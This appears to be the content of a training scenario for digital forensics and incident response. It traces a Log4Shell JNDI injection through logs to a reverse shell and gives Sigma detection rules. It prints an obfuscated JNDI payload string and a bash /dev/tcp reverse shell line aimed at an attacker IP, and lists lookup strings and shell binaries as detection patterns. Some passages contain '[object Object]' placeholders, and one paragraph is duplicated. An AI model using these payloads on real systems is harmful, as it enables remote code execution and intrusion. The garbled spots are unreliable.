scenario.name: Log4Shell JNDI Injection to Reverse Shell (DFIR Log Trace)
scenario.shortSubtitle: Network & Web DFIR · Web Access Logs, Rogue LDAP, Java Spawning Bash & Auditd
scenario.overview: A hotel reception clerk writes every guest badge note verbatim into a smart ledger that automatically phones any directory number printed on the paper. A visitor hands over a slip listing an outside phone bureau, so the clerk dials out, fetches an unsigned instruction booklet from a street kiosk, and hands the master phone line to the caller. In this scenario (CVE-2021-44228, Log4Shell JNDI Injection to Reverse Shell) at 10.20.1, the attacker plants a malicious lookup string so a helpful logger dials out and loads remote code instead of writing plain text. The attack unfolds in one continuous arc: hide a JNDI LDAP lure inside an HTTP header (so the guestbook dials an outside bureau), force Log4j to evaluate that lookup (so the app asks the attacker what to build), follow the LDAP referral to download bytecode (so unsigned instructions enter the JVM), then run the static initializer into a reverse shell (handing the line to the caller). Steps #1–#4 walk that chain end-to-end by covering the poisoned header, outbound LDAP call, remote class load, and shell spawn, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible. Primary detection pivots on Suricata and nginx access-log telemetry across the kill chain.

details.description: External attacker dispatching crafted HTTP requests containing obfuscated JNDI lookup strings.
Ingress reverse proxy logging the raw HTTP request in access.log before forwarding to the Java backend.
Vulnerable Java microservice whose Log4j2 logger evaluates the JNDI string and initiates an outbound LDAP connection.
Attacker-controlled LDAP referral server directing the victim JVM to load and instantiate Exploit.class over HTTP.
Linux Audit daemon capturing the exact execve system call where the Java process spawns /bin/sh and establishes a reverse shell.

stages.title: INJECT JNDI PAYLOAD IN HTTP HEADER
stages.subtitle: Obfuscated User-Agent bypasses basic WAF signature
stages.description: The visitor walks up to the front desk and presents a paper badge note containing a special lookup code instead of a normal guest name. The desk clerk copies the entire line directly into the smart ledger without checking whether the note contains a directory command. The attacker (91.214.124.88) sends an HTTPS GET request to /api/v1/login on the Nginx Reverse Proxy (10.20.1.10:443), placing an obfuscated Log4j lookup expression, ${${lower:j}ndi:${lower:l}dap://91.214.124.88:1389/Exploit} (using nested ${lower:...} tokens to evade basic WAF string filters while still resolving to a JNDI lookup), inside the HTTP User-Agent and X-Api-Version headers (chosen because web servers automatically write these headers into their access and failed-login audit logs). Nginx logs the request and returns HTTP 401 Unauthorized after forwarding it to the Spring Boot backend (10.20.1.15, PID 1420), which immediately passes the unauthenticated request’s User-Agent string into logger.info() (triggering the vulnerability even though the login attempt itself returned 401). Web applications routinely pass HTTP headers like User-Agent or X-Api-Version into logger.info("Failed login from UA: " + userAgent) (recording client metadata for security audit trails). Because Log4j2 v2.0 to 2.14.1 had message pattern lookups enabled by default (designed to resolve variables like ${java:version} inside log lines), logging the rejected HTTP 401 request causes JndiLookup.lookup() inside java (PID 1420) to parse and execute the embedded "${jndi:ldap://...}" expression. On the diagram, follow Step #1 / Link #1 (#1→ HTTP JNDI / ⇠#1 RESP HTTP 401) from Node ① (#1 Attacker Exploit & Scanner) to Node ② (#2 DMZ WAF & Reverse Proxy), monitored by Node ⑥ (#6 Linux Auditd & Elastic SIEM).

stages.title: LOG4J JNDI EVALUATION & OUTBOUND LDAP
stages.subtitle: JndiManager initiates TCP/1389 connection to rogue LDAP
stages.description: As soon as the ledger reads the special lookup code, its built-in dialer automatically places an outgoing call through the lobby switchboard to the outside phone bureau printed on the slip. Instead of writing the string literally to disk, Log4j’s MessagePatternConverter inside the Java process (PID 1420 on app-prod-01, 10.20.1.15) hands the "${jndi:ldap://...}" expression to the Java Naming and Directory Interface (JNDI, Java’s built-in API for looking up shared enterprise objects over a network directory). JNDI opens an outbound TCP connection from 10.20.1.15:49210 to port 1389 on the attacker’s rogue Marshalsec LDAP server at 91.214.124.88:1389 and sends a 118-byte LDAP SearchRequest for baseObject "Exploit" (forcing the internal web server to reach out across the firewall and ask the attacker’s directory server how to construct the logged object). JNDI supports pluggable directory protocols including LDAP, RMI, and DNS. Because Log4j2 v2.14.1 placed no domain whitelist on JndiManager.lookup(), an attacker-supplied ldap://91.214.124.88:1389/Exploit URL forces javax.naming.InitialContext.lookup() inside PID 1420 to transmit the outbound LDAP SearchRequest (118 B) and accept the rogue server’s LDAP SearchResultEntry response containing external class-loading attributes. In the documented Suricata / Zeek exchange from DMZ WAF & Reverse Proxy to Java App Server (app-prod-01), Java App Server (app-prod-01) responds with ALERT 118 B (confirming that the LDAP QUERY request succeeded on Java App Server (app-prod-01) and establishing the runtime state required for Step #3 LDAP REFERRAL & REMOTE CLASS LOADING). On the diagram, follow Step #2 / Link #2 (#2→ LDAP QUERY / ⇠#2 ALERT 118 B) from Node ② (#2 DMZ WAF & Reverse Proxy) to Node ③ (#3 Java App Server (app-prod-01)), monitored by Node ⑥ (#6 Linux Auditd & Elastic SIEM).

stages.title: LDAP REFERRAL & REMOTE CLASS LOADING
stages.subtitle: JVM fetches http://91.214.124.88:8888/Exploit.class
stages.description: The outside phone bureau does not give a simple name; instead, it hands back a forwarding slip pointing to a nearby street kiosk. The trusting clerk walks over to that kiosk and carries back an unsigned instruction booklet. The attacker’s LDAP server (91.214.124.88:1389) replies with a JNDI Naming Reference containing javaCodeBase="http://91.214.124.88:8888/" and javaFactory="Exploit" (directory attributes that tell the Java server that the requested object class is hosted at an external HTTP URL). Obeying those attributes, the JVM (PID 1420 on 10.20.1.15) sends an HTTP GET /Exploit.class request to 91.214.124.88:8888 and receives an HTTP 200 OK response delivering 1.8 KB (1,842 bytes) of compiled Java bytecode (application/java-vm with magic header 0xCAFEBABE, which URLClassLoader.findClass("Exploit") maps directly into JVM memory). When an LDAP SearchResultEntry includes javaClassName, javaCodeBase, and javaFactory, Java’s NamingManager.getObjectInstance() automatically spawns a URLClassLoader pointing to http://91.214.124.88:8888/Exploit.class (allowing the attacker to stream a 1.8 KB compiled Java class over standard HTTP and instantiate it inside PID 1420). Mechanically, this stage is complete only after [object Object] and [object Object] is observed as live runtime state (the concrete checkpoint proving the previous stage's output now drives the next action). On the diagram, follow Step #3 / Link #3 (#3→ Exploit.class / ⇠#3 RESP 1.8 KB) from Node ③ (#3 Java App Server (app-prod-01)) to Node ① (#1 Attacker Exploit & Scanner), monitored by Node ⑥ (#6 Linux Auditd & Elastic SIEM).

stages.title: JAVA SPAWNS /BIN/BASH REVERSE SHELL
stages.subtitle: Linux Auditd captures java (PID 1420) spawning /bin/sh
stages.description: The clerk opens the cover page of the instruction booklet, which triggers a built-in setup checklist before any chapter is even read. Following that opening page, the clerk picks up the hotel back-office handset and opens a live private line straight to the outsider. The instant the JVM (java, PID 1420) initializes Exploit.class in memory, the class’s static {} initializer block invokes Runtime.getRuntime().exec() (Java’s native OS command runner). This causes /usr/bin/java (PID 1420, running as service account tomcat, uid=1001) to execute the Linux kernel execve syscall and spawn /bin/sh (PID 8912, PPID 1420) with command line: /bin/sh -c "bash -i >& /dev/tcp/91.214.124.88/4444 0>&1" (redirecting standard input, output, and error over a live TCP socket to 91.214.124.88:4444 so the attacker receives an interactive shell under the tomcat service user). By placing the payload inside the class’s static {} block or no-argument constructor, the attacker guarantees that OS commands execute under the tomcat service account (uid=1001) during Class.forName() initialization (where the kernel returns child PID 8912 and duplicates the socket file descriptors via dup2 before Log4j even finishes formatting the log line). Mechanically, this stage is complete only after [object Object] and [object Object] is observed as live runtime state (the concrete checkpoint proving the previous stage's output now drives the next action). On the diagram, follow Step #4 / Link #4 (#4→ SPAWN /BIN/SH / ⇠#4 ACK PID 8912) from Node ③ (#3 Java App Server (app-prod-01)) to Node ④ (#4 Java Log4j2 → /bin/bash Shell), monitored by Node ⑥ (#6 Linux Auditd & Elastic SIEM).

detectionRule.title: Log4Shell Exploitation Attempt in Web Access Logs
detectionRule.ruleCode:
title: Log4Shell CVE-2021-44228 Web Log Detection
logsource:
  category: webserver
detection:
  selection:
    cs-user-agent|contains:
      - '${jndi:'
      - '${lower:'
      - '${upper:'
      - ':ldap://'
      - ':rmi://'
  condition: selection
level: critical
detectionRule.mitigation: Upgrade Log4j2 to >= 2.17.1, set -Dlog4j2.formatMsgNoLookups=true, and block nested ${...} lookup patterns at the WAF.

detectionRule.title: Java Process Spawning Interactive Linux Shell
detectionRule.ruleCode:
title: Java Application Spawning Shell Process
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    ParentImage|endswith: '/java'
    Image|endswith:
      - '/sh'
      - '/bash'
      - '/dash'
      - '/zsh'
  condition: selection
level: critical
detectionRule.mitigation: Configure Auditd rules on execve for web service UIDs and restrict child process spawning via AppArmor or SELinux profiles.

This causes /usr/bin/java (PID 1420, running as service account tomcat, uid=1001) to execute the Linux kernel execve syscall and spawn /bin/sh (PID 8912, PPID 1420) with command line: /bin/sh -c "bash -i >& /dev/tcp/91.214.124.88/4444 0>&1" (redirecting standard input, output, and error over a live TCP socket to 91.214.124.88:4444 so the attacker receives an interactive shell under the tomcat service user).
steps.howItWorksInPractice: By placing the payload inside the class’s static {} block or no-argument constructor, the attacker guarantees that OS commands execute under the tomcat service account (uid=1001) during Class.forName() initialization (where the kernel returns child PID 8912 and duplicates the socket file descriptors via dup2 before Log4j even finishes formatting the log line). Mechanically, this stage is complete only after [object Object] and [object Object] is observed as live runtime state (the concrete checkpoint proving the previous stage's output now drives the next action).
